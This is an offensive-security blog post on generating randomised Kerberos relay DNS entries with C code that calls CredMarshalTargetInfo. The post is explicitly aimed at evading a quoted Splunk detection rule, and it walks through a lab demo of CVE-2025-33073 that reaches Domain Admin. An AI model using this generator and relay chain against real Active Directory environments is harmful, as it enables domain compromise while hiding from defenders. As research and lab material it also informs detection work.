---
title: "Build your own Kerberos relay DNS entry"
published: 2026-03-03
description: How to build your own Kerberos relay DNS entry, for example to exploit the CVE-2025-33073
tags: [Research, Kerberos, Active Directory, Relay, WINAPI]
image: /images/kerbemix/logo.png
category: Research
draft: false
---


# Motivations

Relay attacks are a formidable weapon when it comes to Active Directory. In most cases, we perform NTLM authentication relaying, but in recent years it has been discovered that Kerberos relaying is also possible (see https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html).

In order to coerce+relay a kerberos authentication, we can use specific DNS entries or spoof them using IPv6 DHCP response or ARP poisoning.

As seen in many blog post, a DNS entry widely used (where `hostname` is the target machine) :
```
<hostname>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Or it's variant that works on every hosts :
```
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA
```

Now, the questions are :
* **Can we generate others ?**
* **Can we randomize them ?**
* **How can it be more OPSEC ?**

## OPSEC motivations

The blue teamers aren't fools. We can see all over the internet that the blue team started to detect the whole original entry string or parts of it.

As we can see in this [Splunk rule](https://research.splunk.com/network/8551252d-b5b6-4b6e-8a82-51460aeb29a3), it tries to detect entries that contains both "1UWhRC", "AAAAA" and "YBAAAA".

```python
| tstats `security_content_summariesonly` count min(_time) as firstTime max(_time)
as lastTime values(DNS.src) as src values(DNS.dest) as dest from
datamodel=Network_Resolution where DNS.query="*1UWhRC*" DNS.query="*AAAAA*" DNS.
query="*YBAAAA*" by DNS.answer DNS.answer_count DNS.query DNS.query_count DNS.
reply_code_id DNS.src DNS.vendor_product 
...
```

The objective will then be to get rid of those parts, as much as possible.

## Marshal

After adding it to the Active Directory using a tool like [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (redirecting to your attacking machine's IP), we can use the entry to coerce and relay the target machine (see https://www.thehacker.recipes/ad/movement/kerberos/relay).

But what is it really made of ? This DNS entry is composed of a [CREDENTIAL_TARGET_INFORMATIONW](https://learn.microsoft.com/en-us/windows/win32/api/wincred/ns-wincred-credential_target_informationw) structure that is marshaled (or serialized) by the following function : [CredMarshalTargetInfo](https://learn.microsoft.com/en-us/windows/win32/api/ntsecpkg/nf-ntsecpkg-credmarshaltargetinfo).

Example :
```
marshaltest.TargetName = "3"
marshaltest.NetbiosServerName = "C"
marshaltest.DnsServerName = "4"
marshaltest.NetbiosDomainName = "D"
marshaltest.DnsDomainName = ""
marshaltest.DnsTreeName = ""
marshaltest.PackageName = ""
marshaltest.Flags = 50

CredMarshalTargetInfo(marshaltest) -> 1UWhRKDAAAAAAAAACAgAAIAACAAAAAAAAAwW0B3C4DgBAAAA
```

In fact, `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA` is just the smallest `CREDENTIAL_TARGET_INFORMATIONW` structure possible (with all fields empty).

:::note
In a few articles, the original entry was built modifying by hooking on lsass.exe and modifying fields on the fly in memory (see https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx).
:::

## Finding the function

Now Microsoft is telling us the function is in the `Advapi32.dll` shared library. I could never find that function in any version of that library.

![function not found](/images/kerbemix/image-1.png)

So I started to search somewhere through System32 DLLs using DLL Export Viewer.

![Searching the function](/images/kerbemix/image-2.png)

As we see, the function is only in `sspicli.dll` and `secure32.dll` (which contains a reference to `sspcli.dll`).

![Finding the function](/images/kerbemix/image-4.png)

## Generating our first curstom Marshal

Using `sspcli.dll`, we can now generate the Marshal of an hardcoded `CREDENTIAL_TARGET_INFORMATIONW` using this C code :

```c
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <time.h>

typedef struct _CREDENTIAL_TARGET_INFORMATIONW {
  LPSTR   TargetName;
  LPSTR   NetbiosServerName;
  LPSTR   DnsServerName;
  LPSTR   NetbiosDomainName;
  LPSTR   DnsDomainName;
  LPSTR   DnsTreeName;
  LPSTR   PackageName;
  ULONG   Flags;
  DWORD   CredTypeCount;
  LPDWORD CredTypes;
} CREDENTIAL_TARGET_INFORMATIONW;

typedef NTSTATUS (WINAPI *PFN)(
    const CREDENTIAL_TARGET_INFORMATIONW* InTargetInfo,
    PUSHORT* Buffer,
    PULONG size
);

int main(int argc, wchar_t* argv[]){
    PUSHORT buffer = NULL;
    ULONG size = 0;

    HMODULE hAdv = LoadLibraryW(L"sspicli.dll");
    if (!hAdv) {
        printf("Could not load sspicli.dll\n");
        return 1;
    }

    PFN CredMarshalTargetInfo = (PFN)GetProcAddress(hAdv, "CredMarshalTargetInfo");
    if (!CredMarshalTargetInfo) {
        printf("CredMarshalTargetInfo not found in sspcli.dll\n");
        return 1;
    }

    CREDENTIAL_TARGET_INFORMATIONW info = {0};

    info.TargetName = "3";
    info.NetbiosServerName = "C";
    info.DnsServerName = "4";
    info.NetbiosDomainName = "D";
    info.DnsDomainName = "";
    info.DnsTreeName = "";
    info.PackageName = "";
    info.Flags = 50;

    NTSTATUS status = CredMarshalTargetInfo(&info, &buffer, &size);
    if (status != 0) {
        printf("CredMarshalTargetInfo failed: 0x%08X\n", status);
        return 1;
    }

    printf("[+] Marshal : ");
    for (int i = 0; i < size; i = i+2) { wprintf(L"%c", ((BYTE*)buffer)[i]); }
    putchar(10);

    LocalFree(buffer);
    return 0;
}
```

We compile and run the code (on Windows obviously), giving us the Marshal we talked about earlier.

![Compile and run test](/images/kerbemix/image.png)

Also, this is a double success. As we can see, using non-empty fields allows us to get rid of two of the flagged parts mentionned earlier : "1UWhRC" and "YBAAAA". Generating the entries like this is thus more OPSEC.

## Randomizing the generation

As we can notice trying to coerce with randomly generated entries, the fields content doesn't matter at all. For example, the field `Flags` has three possible values (1, 2 and 4) but we can make as much as the `ULONG` type allows (4294967295).

The only constraint is the maximum length of a DNS entry in the Active Directory, which is 63, knowning two things :
* the entry must be prefixed by `localhost` or the targeted hostname, so at least 9 additional chars
* The smallest marshal that can be produced is `1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA`, which makes 44 chars

We don't have much space left, so i decided to put a random capital character in every string field and to randomize the `Flags` attribute between 4748364 and 9496728.

```c
short TargetName[] = {'A'+rand()%26, 0};
short NetbiosServerName[] = {'A'+rand()%26, 0};
short DnsServerName[] = {'A'+rand()%26, 0};
short NetbiosDomainName[] = {'A'+rand()%26, 0};
short DnsDomainName[] = {'A'+rand()%26, 0};
short DnsTreeName[] = {'A'+rand()%26, 0};
short PackageName[] = {'A'+rand()%26, 0};
...
info.Flags = 4748364 + rand() % 4748364;
```

This gives us `26**7+(9496728-4748364) == 8036558540` different possible entries, which is more than enough.

The code can be found on my github : https://github.com/3C4D/kerbemix

Below an example of random generation :

![Result Example](/images/kerbemix/generation.png)

:::note
You will see that i made a "less functioning" prototype (kerbemix_reduced) in python for Linux. It takes the original entry and fuzz it to find random variants. It works, but doens't really do the job as it does not allow to get rid of some parts of the entry. It is also "dirty" as the entries aren't guaranteed to work.

The only use of the snippet can be to generate a random entry fast if you only have a linux on your hand during an assessment.

![reduced version](/images/kerbemix/reduced.png)
:::

## Let's put in in practice

For the demo, I used one of [Vulnlab](https://www.vulnlab.com/)'s machine, [Bruno](https://wiki.vulnlab.com/guidance/medium/bruno), which contains a domain controller vulnerable to the [CVE-2025-33073](https://nvd.nist.gov/vuln/detail/CVE-2025-33073).

:::note
When a machine is vulnerable to the CVE-2025-33073, it is possible to compromise it by relaying the machiself to itself using kerberos relay.
:::

* First, we generate a random DNS entry using the tool.

![generating_dns](/images/kerbemix/generating_dns.png)

* We add the DNS Entry to the Active Directory

![adding_dns](/images/kerbemix/adding_dns.png)

* We coerce the machine using the DNS entry

![coerce](/images/kerbemix/coerce.png)

* We launch [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) to relay the vulnerable domain controller on its LDAPS service (It also work with LDAP and with SMB when the machine doesn't sign SMB trafic). We can see that we obtained a session that we can access interactively.

![relay](/images/kerbemix/relay.png)

* When we connect, as we are administrator of the LDAP service (`NT AUTHORITY/SYSTEM`), we can add our user (`test`) in the `Domain Admins` group.

![privesc](/images/kerbemix/privesc.png)

* We can now connect to the domain controller with SMB protocol and see we are administrator of the machine (as we are a domain administrator).

![alt text](/images/kerbemix/connection.png)

## Conclusion

* We thought we could only generate KRB relay entries by hooking on LSASS, but we found another way
* We can generate a lot of different random entries
* The generated entries can bypass blue team rules (for how long ?)

Thanks for reading :)

3C4D